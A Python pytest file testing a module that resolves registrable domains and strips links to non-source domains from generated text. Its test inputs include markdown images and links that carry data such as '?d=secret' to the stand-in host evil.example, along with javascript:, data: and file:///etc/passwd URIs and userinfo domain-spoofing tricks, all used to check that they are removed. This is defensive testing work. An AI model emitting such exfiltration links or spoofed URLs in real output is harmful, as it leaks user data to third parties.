"""Registrable domains offline, source independence, and removal of foreign links (R5)."""

from __future__ import annotations

import re

import pytest
from hypothesis import given
from hypothesis import strategies as st

from core.verification.domains import (
    REMOVED,
    independent_domains,
    registrable_domain,
    strip_foreign_links,
)

SOURCES = ["https://fr.wikipedia.org/wiki/Lyon", "https://www.insee.fr/fr/statistiques/1"]


@pytest.mark.parametrize(
    ("url", "domain"),
    [
        ("https://fr.wikipedia.org/wiki/Lyon", "wikipedia.org"),
        ("https://www.bbc.co.uk/news", "bbc.co.uk"),
        ("https://a.github.io/x", "a.github.io"),  # private suffix: one site per user
        ("HTTPS://WWW.EXAMPLE.COM./", "example.com"),
        ("https://user:pw@evil.example.com/", "example.com"),
        ("https://fr.wikipedia.org@evil.example/", "evil.example"),
        ("https://bücher.de/", "xn--bcher-kva.de"),
        ("https://192.168.0.1:8080/", "192.168.0.1"),
        ("https://[2001:db8::1]/", "2001:db8::1"),
        ("https://localhost/", "localhost"),
        ("www.lemonde.fr/a", "lemonde.fr"),
        ("www.lemonde.fr:8080/a", "lemonde.fr"),
    ],
)
def test_registrable_domain(url: str, domain: str) -> None:
    # pytest-socket blocks the network: the public suffix list is the bundled snapshot.
    assert registrable_domain(url) == domain


@pytest.mark.parametrize("url", ["", "https://", "https://[bad/", "mailto:"])
def test_no_domain(url: str) -> None:
    assert registrable_domain(url) is None


def test_independent_domains() -> None:
    urls = [
        "https://fr.wikipedia.org/a",
        "https://en.wikipedia.org/b",
        "https://www.lemonde.fr/c",
        "https://lemonde.fr/d",
        "https://a.github.io/",
        "https://b.github.io/",
        "pas une adresse",
    ]
    assert independent_domains(urls) == [
        "wikipedia.org",
        "lemonde.fr",
        "a.github.io",
        "b.github.io",
    ]


@pytest.mark.parametrize(
    "text",
    [
        "Voir [Lyon](https://fr.wikipedia.org/wiki/Lyon) [1].",
        "Voir [Lyon](https://fr.wikipedia.org/wiki/Lyon_(ville)).",
        "Voir [la version anglaise](https://en.wikipedia.org/wiki/Lyon).",  # same domain
        "![carte](https://upload.wikipedia.org/carte.png)",
        "<https://www.insee.fr/fr/statistiques/1>",
        "Source : https://www.insee.fr/fr/statistiques/1.",
        '[insee][1]\n\n[1]: https://www.insee.fr/ "Insee"',
        "Aucun lien ici [1], ni <PERSONNE_1>.",
    ],
)
def test_links_to_sources_are_kept(text: str) -> None:
    result = strip_foreign_links(text, SOURCES)
    assert result.text == text
    assert result.removed == 0


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("[cliquez ici](https://evil.example/?q=<PERSONNE_1>) !", "cliquez ici !"),
        ("Avant ![x](https://evil.example/p.png?d=secret) après", "Avant  après"),
        ('[x](https://evil.example/a "titre")', "x"),
        ("[x](<https://evil.example/a b>)", "x"),
        ("[x](//evil.example/a)", "x"),
        ("[x](https://wikipedia.org.evil.example/)", "x"),
        ("[x](https://evil-wikipedia.org/)", "x"),
        ("[x](https://fr.wikipedia.org@evil.example/)", "x"),
        ("[x](https://evil.example\\@fr.wikipedia.org/)", "x"),
        ("[x](javascript:alert(1))", "x"),
        ("[x](data:text/html;base64,AAAA)", "x"),
        ("![x](data:image/png;base64,AAAA)", ""),
        ("[x](file:///etc/passwd)", "x"),
        ("[x](relative/path)", "x"),
        (
            "[x][ref] et ![i][img]\n\n[ref]: https://evil.example/a\n[img]: https://evil.example/i.png",
            "x et \n\n",
        ),
        ("[ref][]\n[ref]: <https://evil.example/a>\n", "ref\n"),
        ("<https://evil.example/a>", REMOVED),
        ("<mailto:a@evil.example>", REMOVED),
        ("voir https://evil.example/a?d=1.", f"voir {REMOVED}."),
        ("voir HTTPS://EVIL.EXAMPLE/A", f"voir {REMOVED}"),
        ("voir www.evil.example/a, puis", f"voir {REMOVED}, puis"),
        ('<img src="https://evil.example/p.png">texte', "texte"),
        ('<a href="https://evil.example/">clic</a>', "clic"),
        ('<IMG SRC="https://fr.wikipedia.org/x.png">', ""),  # raw HTML: always removed
    ],
)
def test_foreign_links_and_images_are_removed(text: str, expected: str) -> None:
    assert strip_foreign_links(text, SOURCES).text == expected


def test_only_domains_are_reported() -> None:
    result = strip_foreign_links(
        "![a](https://evil.example/p.png?d=secret) [b](https://evil.example/autre) "
        "[c](javascript:void(0)) [d](relatif)",
        SOURCES,
    )
    assert result.removed_domains == ("evil.example", "javascript", "relatif")
    assert result.removed == 4
    assert "secret" not in repr(result.removed_domains)


def test_urls_given_by_lucas_are_allowed() -> None:
    text = "D'après [le rapport](https://rapport.example/doc.pdf)."
    assert strip_foreign_links(text, [*SOURCES, "https://rapport.example/"]).text == text


_TOKENS = st.sampled_from(
    [
        "https://",
        "http:",
        "//",
        "www.",
        "evil.example",
        "javascript:",
        "data:",
        "![",
        "[",
        "]",
        "(",
        ")",
        "<",
        ">",
        "a",
        " ",
        "\n",
        ".",
        "/",
        "\\",
        "@",
        "img src=",
        '"',
        ":",
    ]
)


@given(st.lists(_TOKENS, max_size=40).map("".join))
def test_nothing_link_like_survives_without_allowed_domains(text: str) -> None:
    result = strip_foreign_links(text, [])
    assert not re.search(r"(?i)//[^\s<>()\[\]\"'`]|www\.[^\s<>()\[\]\"'`]", result.text)
    assert strip_foreign_links(result.text, []).text == result.text  # nothing left to remove


def test_a_removal_does_not_build_a_new_link() -> None:
    result = strip_foreign_links("[x](javascript:[y](https://evil.example/)alert(1))", [])
    assert "javascript" not in result.text
    assert strip_foreign_links(result.text, []).text == result.text
